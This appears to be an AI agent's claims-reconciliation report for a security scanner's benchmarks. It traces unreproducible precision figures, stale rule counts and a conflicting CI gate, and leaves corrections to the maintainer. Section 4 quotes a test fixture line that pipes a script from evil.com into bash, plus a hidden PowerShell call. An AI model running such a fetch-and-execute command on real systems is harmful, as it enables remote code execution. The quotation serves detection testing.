# CLAIMS RECONCILIATION

Every number this project publishes, against what reproduces today.

**Nothing public-facing was edited to produce this document.** The only files this run
changed that a reader could call published are `docs/RULES.md` and `engine.py`'s rule
table, and that change was the W19 deliverable — withdrawing six rules that cannot fire —
not a claims correction. Everything below is a report. **Which of these gets corrected,
and in what order, is Heady's call.** Some of them may have reached a paper, a slide deck
or an outreach message, where the order is retract-then-restate.

---

## 0. What reproduces today

Commit `25636c3`, CPython 3.14.3 for tests / 3.11.14 for the audit-target harness,
`PYTHONHASHSEED` pinned.

| measurement | command | value |
|---|---|---|
| Layer 1 | `python3 tests/benchmark/precision_recall.py` | **TP 196 / FP 93 / FN 40 — P 67.82% / R 83.05% / F1 74.67%** |
| AVB `knowns` | `python3 -m "agent-vuln-bench.harness.run_eval" --tool agent-audit --dataset knowns` | **R 100.0% / P 88.0% / F1 0.9362** |
| audit target | `./run_eval.sh --commit 25636c3` | **noise 44 / high-value 20 = 2.2:1**, recall 0/6 |
| advertised rules | `tests/test_rule_producers.py` | **66** (86 including the DeFi profile) |
| test suite | `pytest tests/ -q` | **1748 passed, 1 skipped** |
| version | `agent_audit.__version__` | **0.19.2** |

---

## 1. `tests/README.md`'s 98.51% — traced, and it is not a measurement

RUN4 flagged this as the number to look at first: **P 98.51% / R 100% / F1 99.25% / FP
rate 1.49%**, thirty points of precision above the current figure, carrying no retraction
anywhere. Thirty points is too large for run-to-run variance, so there had to be a
methodology difference. There is, and it is more serious than a different corpus.

**Provenance.** `git log -S "98.51" -- tests/README.md` returns exactly one commit:
`a65b341`, "feat: release v0.5.2", 2026-02-04.

**The results file committed in that same commit says something else.**

```
$ git show a65b341:results/layer1.json
  "true_positives": 112,
  "false_positives": 4,
  "false_negatives": 124,
  "precision": 0.9655172413793104,
  "recall": 0.4745762711864407,
  "f1_score": 0.6363636363636365,
```

P 96.55% / R 47.46% / F1 0.6364 — not 98.51 / 100 / 99.25. Neither precision nor recall
matches. The published number was never produced by the script whose output the repository
committed beside it.

**Where the number does come from.** `tests/README.md` states the corpus as 198
annotations and names "剩余误报: 3 个" — three residual false positives. Take TP = 198
(every annotation matched), FP = 3, **FN = 0**:

```
$ python3 -c "tp,fp=198,3; p=tp/(tp+fp); r=1.0; print(p, r, 2*p*r/(p+r), fp/(tp+fp))"
P = 98.5075%   R = 100.00%   F1 = 99.2481%   FP rate = 1.49%
```

All four published figures, to four decimal places.

**So the methodology difference is that false negatives were assumed to be zero rather
than measured.** Recall was not computed; it was set to 100% by construction, and
precision followed from the annotation count. The same commit's measured false-negative
count was 124.

Three further inconsistencies inside that one commit, recorded because they bear on how
much of the surrounding text to trust:

* `tests/README.md` says ground truth **v2.1, 42 files, 198 annotations**. The commit
  message of the same commit says **v2.2, 81 samples, 218 annotations**.
* `tests/README.md:270` says v2.1 "added 87 new annotations, reaching 98.51% Precision",
  attributing the precision to a labelling change.
* `CHANGELOG.md:175-177` carries the number forward as "Precision: 98.51% → 100%",
  "F1 Score: 100%" — a *further* improvement on a figure that was already an assumption.

**Reach.** Within the repository the figure appears at `tests/README.md:116,118,119,279,281,282`,
`tests/README.md:270`, and `CHANGELOG.md:175-177`. `agent-audit-slides.html` does not
exist in this tree; no `*-EXECUTION-SUMMARY.md` quotes it. Nothing outside the repository
was traversed.

**Recommended correction.** This one is different in kind from the rest of the table.
Rows 2–9 below are *stale measurements* — they were true of an older commit or corpus.
This is a **derived figure presented as a measurement**, and no re-run can reproduce it,
because no scan ever produced it. It should be struck rather than updated, with a note
saying what it was. It is also the highest-priority item here if any of it has left the
repository, because "98.51% precision" is the kind of claim a reader takes as an
experimental result.

---

## 2. The headline F1 family

| # | claim | source | reproduces today as | delta |
|---|---|---|---|---|
| 1 | P 73.58% / R 82.63% / F1 0.778, TP 195 / FP 70 / FN 41 | `CLAUDE.md:11` | P 67.82% / R 83.05% / F1 0.7467, TP 196 / FP 93 / FN 40 | P **−5.76pp**, F1 **−0.031**, FP **+23** |
| 2 | same | `README.md:97`, `:233` | as above | as above |
| 3 | same | `README_CN.md:98`, `:214` | as above | as above |
| 4 | R 82.63% / F1 0.778 hero tiles | `docs/index.html:923,927` | R 83.05% / F1 0.7467 | F1 **−0.031** |
| 5 | R 82.63% / P 73.58% / F1 0.778 comparison row | `docs/index.html:1074–1076` | as row 1 | as row 1 |
| 6 | "F1 0.778 (raw, reproducible)" | `docs/BENCHMARK-RESULTS.md:7`, `:228` | as row 1 | as row 1 |
| 7 | "Raw F1 0.7784 matches the documented 0.778 exactly" + transcript | `docs/F1_REPRODUCTION.md:35,38` | F1 74.67% | **−0.031** |
| 8 | adjusted F1 0.840–0.846 table | `docs/F1_REPRODUCTION.md:50–51` | inputs (TP 195 / FP 30–33) have all moved | stale inputs |
| 9 | `"f1_score": 0.7784431137724551` | `results/layer1_v0.19.0.json:7` | 0.7467 | **−0.031** |

**The cause is known, cumulative and innocent, and it must travel with the number.**
Precision has fallen in three steps, none of them a detection regression:

| step | what happened | FP | precision |
|---|---|---|---|
| v0.19.0 as published | — | 70 | 0.7358 |
| `f649dcc` (RUN3) | MCP config discovery made recursive; 20 previously-unreachable findings became possible, 18 of them correct and unlabelled (RUN4 § W16) | 90 | 0.6853 |
| `d4d2850` (this run) | AI-tool hook discovery made recursive; 3 previously-unreachable findings became possible, all 3 correct and unlabelled (§ 4 below) | 93 | 0.6782 |
| `2ee8345` (this run) | AGENT-034 gated on a tool boundary | 93 | 0.6782 |

Every point of precision lost since v0.19.0 was lost by **fixing a discovery bug** — the
tool started finding things the corpus never labelled. Recall rose over the same period
(0.8263 → 0.8305). Stating the F1 drop without that sentence attached would misrepresent
it as a quality regression, which it is not.

The v0.19.0 figure additionally sat at the high end of a ±1 TP coin flip when it was
recorded; the evaluator was non-deterministic until `cca9265`, worth ±0.004 on each
metric.

**Recommended correction.** Restate as `P 67.82% / R 83.05% / F1 0.747, TP 196 / FP 93 /
FN 40` with the three-step causal note. `docs/F1_REPRODUCTION.md` already carries a
retraction for the 0.842 adjusted figure and is the natural place for the note.

---

## 3. The rule count — seven different numbers, and now an eighth

This is the claim W19 was about, and the spread is wider than "53 vs 72".

| published count | source | what it counted | delta vs. 66 |
|---|---|---|---|
| **66** | `docs/RULES.md:1419` (written this run) | rules that can actually fire on a default scan | — |
| 72 | `README.md:28,272,287` | the same set **before** six unproducible rules were withdrawn | **+6** |
| 92 | `CLAUDE.md:56` | `RULE_CWE_MAPPING` including the 20 DeFi rules; now 86 | **+26** (or +20 if DeFi is meant) |
| 63 | `docs/RULES.md` footer, before this run | neither the body of its own file (72) nor anything else | **−3** |
| **53** | `packages/audit/pyproject.toml:4` — **the PyPI description** | unattributable to any set in the tree at any commit I could find | **−13** |
| 52 | `rules/builtin/*.yaml` | rule IDs carrying a YAML definition — 49 of which are inert (§ 5) | **−14** |
| 49 | `docs/index.html:7,10,896,1190,1207` | v0.16.0-era count; the page also says "v0.16.0" and "1,142 tests passing" | **−17** |
| 40 / 40+ | `docs/ARCHITECTURE.md:74,134,234`; `docs/ROADMAP.md:18`; `docs/README.md:12,199`; `README_CN.md:253` | v0.3-era count | **−26** |

Three of these are defensible if stated — 66 (default scan), 86 (including `--profile
defi`), 52 (YAML definitions) all measure something real. The others are stale.

**`53` in `pyproject.toml` is the one I would fix first.** It is the description PyPI
renders to every visitor, it is the only rule count on a distribution surface, and unlike
the others I cannot reconstruct what it counted.

**`README_CN.md:253` still says 40+ while `README.md:272` says 72** — the two READMEs
disagree with each other in the same diagram.

**Recommended correction.** Pick one operational definition — "rules a default scan can
produce" — publish 66 everywhere, and say separately that `--profile defi` adds 20. If
any external artifact quotes 72, it should be corrected to 66 *with* the reason, because
"we removed six rules" reads badly without "they could never fire".

---

## 4. Three unlabelled true positives, and a CI gate that is now red

Not a claim, but it belongs beside the numbers above because it changes one.

The AGENT-120 discovery fix (`d4d2850`) makes three findings possible that were previously
unreachable, all in `tests/fixtures/agent_architecture/vulnerable_hooks/` — a fixture
written for the rule, containing `powershell -WindowStyle Hidden` and
`curl -s https://evil.com/payload.sh | bash`. All three are true positives by the rule's
own definition. **The corpus labels none of them**; `labeled_samples.yaml` contains no
label citing AGENT-120 or `vulnerable_hooks` across 81 labelled files. AGENT-120 shipped
in v0.19.0 with zero ground-truth coverage.

They therefore score as false positives, and Layer 1 precision falls 0.6853 → 0.6782.

**The consequence is a red CI job, via a gate nobody consolidated.**

`tests/benchmark/gates.yaml` calls itself "THE SINGLE SOURCE OF TRUTH" and carries
`f1_min: 0.72`. Current F1 0.7467 clears it, and `quality_gate_check.py` exits 0.

But `tests/benchmark/precision_recall.py:503` ends with `if result.f1_score < 0.75:
sys.exit(1)`, and `.github/workflows/benchmark.yml:33` runs that script with
`continue-on-error` **deliberately removed** (line 37: "This step now fails the job if
precision_recall.py exits non-zero"). So:

```
$ PYTHONHASHSEED=0 python3 tests/benchmark/precision_recall.py > /dev/null; echo $?
1
```

Two blocking gates on Layer 1 with different floors — 0.72 in the file documented as the
only source, 0.75 hard-coded in the script — which is precisely the contradiction the
`gates.yaml` header says was eliminated when the inline workflow gate was deleted. The
inline gate went; this one was never noticed. Before this run F1 was 0.7510, one
thousandth above the hard floor.

**I did not touch either threshold.** Lowering 0.75 to make the build pass is the move the
`gates.yaml` header explicitly forbids ("Never lower them to make a build pass"), and the
correct resolution is to label the three findings — which is ground truth, and not mine.
Logged as DECISIONS item 31.

---

## 5. Claims about the rule engine that the code does not support

`CLAUDE.md`'s rule-authoring checklist tells contributors that a new rule needs a YAML
`detection` block with `type` and `patterns`, and `docs/ARCHITECTURE.md:134` draws the
`RuleEngine (evaluate)` box as the thing that runs them.

Measured this run (§ W21 in the ledger): `RuleEngine.evaluate()` has one caller in the
repository, a unit test. Wiring it into `scan.py` activates **3 of 84 pattern entries**,
because `_evaluate_rule` dispatches on a key called `type` and 81 of the 84 entries use
`pattern_type` instead — a key the evaluator never reads.

So the checklist is not merely describing a dormant mechanism; it is describing a dialect
the evaluator does not parse. A contributor following it produces a rule that cannot fire
under any circumstance, which is exactly how five of the six rules withdrawn in W19 came
to exist.

**Recommended correction.** `CLAUDE.md` and `docs/ARCHITECTURE.md` should say plainly that
YAML carries rule metadata and that detection lives in scanners — or `evaluate()` should
be rewritten to parse the dialect the rules are actually written in. The measurement for
that decision is in DECISIONS item 32; the recommendation is to retire.

---

## 6. AVB figures: three different sample sets, not deltas

| claim | source | note |
|---|---|---|
| R 94.6% / P 87.5% / F1 0.909 (AVB-19, 2026-02-19) | `docs/BENCHMARK-RESULTS.md:5,23–25,78–80,224–226` | 19-sample set, point-in-time |
| R 95.2% / P 87.0% / F1 0.9091 over 22 samples | `results/avb_report.md` (untracked) | 22-sample set |
| R 100.0% / P 88.0% / F1 0.9362 | measured at HEAD | 12-sample `knowns` set |

**These are not comparable and none of them is a delta.** The P0A invariant is the
`knowns` set and it is unchanged through every commit of this run. What is worth flagging
is presentation: `docs/BENCHMARK-RESULTS.md` puts F1 0.909 in a headline table with the
caveat in a block quote above it, and lines 78–80 run a head-to-head against Bandit and
Semgrep on that basis with no caveat attached at all.

---

## 7. Version, test count and page metadata

| claim | source | today | delta |
|---|---|---|---|
| Version 0.19.0 | `CLAUDE.md:7,11` | `__version__` is 0.19.2 | +2 patch |
| "tests-1541 passed" badge | `README.md:10` | 1748 passed, 1 skipped | **+207** |
| "1541 tests" / "1541+ tests" | `README.md:387`, `CLAUDE.md:92` | as above | as above |
| "Test count: 1542 collected (1541 passing)" | `CLAUDE.md:11` | 1749 collected | +207 |
| "v0.16.0 — 49 rules · 1,142 tests passing" | `docs/index.html:896` | v0.19.2, 66 rules, 1748 tests | three stale values in one line |
| "validated against 18,899 ClawHub skills at 80% precision" | `README.md:146` | not reproducible from this repository | unverifiable here |
| "BLOCK-tier precision: 80% (16/20 TP, Wilson CI 58.4–91.9%)" | `blog_post.md:88`, `twitter_thread.md:85` | a 20-sample manual draw, not a script output | unverifiable here |

The last two are not wrong; they are unfalsifiable from this repository. If either has been
published, the underlying data should be committed or the claim should say where it lives.

---

## 8. Priority

1. **`tests/README.md` 98.51%** — struck, not updated. It is a derived figure presented as
   a measurement and nothing can reproduce it. Highest priority if it has left the repo.
2. **`pyproject.toml` "53 rules"** — the only rule count on a distribution surface, and
   unattributable.
3. **The F1 0.778 family** (9 locations) — restate as 0.747 *with* the discovery-fix
   explanation, or the restatement will read as a regression it is not.
4. **The `precision_recall.py` 0.75 floor** — a live red CI gate contradicting the file
   that calls itself the single source of truth (§ 4). Not a claim, but it blocks.
5. **Rule counts** at 72 / 92 / 49 / 40+ — mechanical, once a definition is chosen.
6. **Version, test count, `docs/index.html` metadata** — mechanical.
7. **`CLAUDE.md` rule-authoring checklist** (§ 5) — it manufactures the defect W19 cleaned
   up, so it should not survive unchanged whichever way DECISIONS 32 goes.
